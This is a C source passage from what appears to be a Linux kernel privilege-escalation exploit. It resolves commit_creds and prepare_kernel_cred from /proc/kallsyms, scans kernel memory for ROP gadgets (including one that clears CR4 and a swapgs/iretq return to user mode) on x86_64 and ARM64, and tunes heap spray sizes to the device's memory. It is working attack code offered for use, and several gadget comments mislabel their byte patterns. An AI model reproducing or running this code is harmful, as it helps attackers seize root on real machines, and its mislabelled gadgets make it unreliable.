// --- AUTOMATIC SYMBOL DISCOVERY ---
void try_auto_kallsyms() {
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        printf("[-] /proc/kallsyms not accessible\n");
        return;
    }
    
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        char *addr_str = strtok(line, " ");
        char *type = strtok(NULL, " ");
        char *name = strtok(NULL, " \t\n");
        if (!name || !addr_str) continue;
        
        uint64_t addr = strtoull(addr_str, NULL, 16);
        // Detect kernel base from first text symbol (type 'T')
        if (kernel_base == 0 && type && type[0] == 'T') {
            kernel_base = addr & ~0xfffULL;
            printf("[+] Kernel base auto-detected: 0x%llx\n", kernel_base);
        }
        
        if (strcmp(name, "prepare_kernel_cred") == 0) {
#ifdef __aarch64__
            prepare_kernel_cred_arm = addr;
#else
            prepare_kernel_cred = addr;
#endif
            printf("[+] prepare_kernel_cred: 0x%llx\n", addr);
        } else if (strcmp(name, "commit_creds") == 0) {
#ifdef __aarch64__
            commit_creds_arm = addr;
#else
            commit_creds = addr;
#endif
            printf("[+] commit_creds: 0x%llx\n", addr);
        } else if (strcmp(name, "init_cred") == 0) {
            init_cred = addr;
            printf("[+] init_cred: 0x%llx\n", addr);
        }
    }
    fclose(fp);
}

// --- AUTOMATIC GADGET SCANNING ---
uint64_t scan_gadget(const unsigned char *pattern, int pattern_len) {
    // Try /dev/kmem if available
    int kmem = open("/dev/kmem", O_RDONLY);
    if (kmem < 0) return 0;
    
    // Scan a region (32MB window)
    uint64_t start = kernel_base;
    uint64_t end = kernel_base + 0x2000000;
    
    unsigned char *buf = malloc(0x1000);
    if (!buf) {
        close(kmem);
        return 0;
    }
    
    for (uint64_t addr = start; addr < end; addr += 0x1000) {
        if (lseek(kmem, addr, SEEK_SET) < 0) break;
        ssize_t n = read(kmem, buf, 0x1000);
        if (n != 0x1000) continue;
        
        for (int i = 0; i < 0x1000 - pattern_len; i++) {
            if (memcmp(buf + i, pattern, pattern_len) == 0) {
                uint64_t found = addr + i;
                free(buf);
                close(kmem);
                return found;
            }
        }
    }
    
    free(buf);
    close(kmem);
    return 0;
}

void find_gadgets_automatically() {
    if (kernel_base == 0) {
        printf("[-] Cannot scan gadgets: kernel_base unknown\n");
        return;
    }
    
#ifdef __aarch64__
    // ARM64 gadget patterns (little-endian)
    // mov x0, #0; ret  -> 00 00 80 d2 c0 03 5f d6
    unsigned char pop_x0_ret_pattern[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
    // mov x8, #func; br x8 -> 00 00 00 90 00 00 1f d6 (adrp+ldr+br pattern)
    unsigned char pop_x8_ret_pattern[] = {0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x1f, 0xd6};
    // return to user: eret sequence
    unsigned char ret_to_user_pattern[] = {0x00, 0x00, 0x00, 0xd4}; // generic eret pattern
    
    if (pop_x0_ret == 0) {
        pop_x0_ret = scan_gadget(pop_x0_ret_pattern, 8);
        if (pop_x0_ret) printf("[+] pop x0; ret found @ 0x%llx\n", pop_x0_ret);
    }
    
    if (pop_x8_ret == 0) {
        pop_x8_ret = scan_gadget(pop_x8_ret_pattern, 8);
        if (pop_x8_ret) printf("[+] pop x8; ret found @ 0x%llx\n", pop_x8_ret);
    }
    
    if (return_to_user_arm == 0) {
        return_to_user_arm = scan_gadget(ret_to_user_pattern, 4);
        if (return_to_user_arm) {
            printf("[+] return_to_user_arm found @ 0x%llx\n", return_to_user_arm);
        } else {
            // Fallback: look for eret instruction followed by common sequences
            return_to_user_arm = kernel_base + 0x100000;
            printf("[!] return_to_user_arm not auto-detected, using fallback 0x%llx\n", return_to_user_arm);
        }
    }
#else
    // x86_64 gadget patterns (little-endian)
    // pop rdi; ret -> 5f c3
    unsigned char pop_rdi_ret_pattern[] = {0x5f, 0xc3};
    // pop rcx; ret -> 59 c3
    unsigned char pop_rcx_ret_pattern[] = {0x59, 0xc3};
    // swapgs; pop rbp; ret -> 0f aa 5d c3
    unsigned char swapgs_pattern[] = {0x0f, 0xaa, 0x5d, 0xc3};
    // iretq -> 48 cf
    unsigned char iretq_pattern[] = {0x48, 0xcf};
    // mov cr4, rdi; ret -> 0f 22 e1 c3 (plus maybe pop rdi before). Actually pattern: pop rdi; mov cr4,rdi; ret = 5f 0f 22 e1 c3
    unsigned char cr4_gadget_pattern[] = {0x5f, 0x0f, 0x22, 0xe1, 0xc3};
    
    if (pop_rdi_ret == 0) {
        pop_rdi_ret = scan_gadget(pop_rdi_ret_pattern, 2);
        if (pop_rdi_ret) printf("[+] pop rdi; ret found @ 0x%llx\n", pop_rdi_ret);
    }
    
    if (pop_rcx_ret == 0) {
        pop_rcx_ret = scan_gadget(pop_rcx_ret_pattern, 2);
        if (pop_rcx_ret) printf("[+] pop rcx; ret found @ 0x%llx\n", pop_rcx_ret);
    }
    
    if (cr4_clear_gadget == 0) {
        cr4_clear_gadget = scan_gadget(cr4_gadget_pattern, 5);
        if (cr4_clear_gadget) printf("[+] cr4_clear gadget found @ 0x%llx\n", cr4_clear_gadget);
    }
    
    if (swapgs_restore_regs_and_return_to_usermode == 0) {
        swapgs_restore_regs_and_return_to_usermode = scan_gadget(swapgs_pattern, 4);
        if (!swapgs_restore_regs_and_return_to_usermode) {
            // Try iretq pattern (swapgs; iretq combo)
            swapgs_restore_regs_and_return_to_usermode = scan_gadget(iretq_pattern, 2);
        }
        if (swapgs_restore_regs_and_return_to_usermode) {
            printf("[+] swapgs_restore gadget found @ 0x%llx\n", swapgs_restore_regs_and_return_to_usermode);
        } else {
            // Fallback: try another common pattern: mov rsp, rsi; ret
            unsigned char mov_rsp_rsi_ret[] = {0x48, 0x89, 0xc6, 0xc3};
            swapgs_restore_regs_and_return_to_usermode = scan_gadget(mov_rsp_rsi_ret, 4);
            if (swapgs_restore_regs_and_return_to_usermode) {
                printf("[+] Using alternative gadget for return: mov rsp, rsi; ret @ 0x%llx\n", swapgs_restore_regs_and_return_to_usermode);
            }
        }
    }
#endif
}

// --- DYNAMIC CONFIGURATION ---
void auto_tune_parameters() {
    struct sysinfo info;
    if (sysinfo(&info) == 0) {
        long total_mem_mb = info.totalram / 1024 / 1024;
        if (total_mem_mb < 2048) {
            num_spray = NUM_SPRAY_BASE / 2;
            num_reclaim = NUM_RECLAIM_BASE / 2;
            printf("[*] Low memory device (%ld MB), reduced spray to %d/%d\n", total_mem_mb, num_spray, num_reclaim);
        } else if (total_mem_mb > 4096) {
            num_spray = NUM_SPRAY_BASE * 2;
            num_reclaim = NUM_RECLAIM_BASE * 2;
            printf("[*] High memory device (%ld MB), increased spray to %d/%d\n", total_mem_mb, num_spray, num_reclaim);
        } else {
            num_spray = NUM_SPRAY_BASE;
            num_reclaim = NUM_RECLAIM_BASE;
        }
    }
}

void detect_kernel_version() {
    struct utsname u;
    if (uname(&u) == 0) {
        printf("[*] System: %s %s %s\n", u.sysname, u.release, u.machine);
    }
}

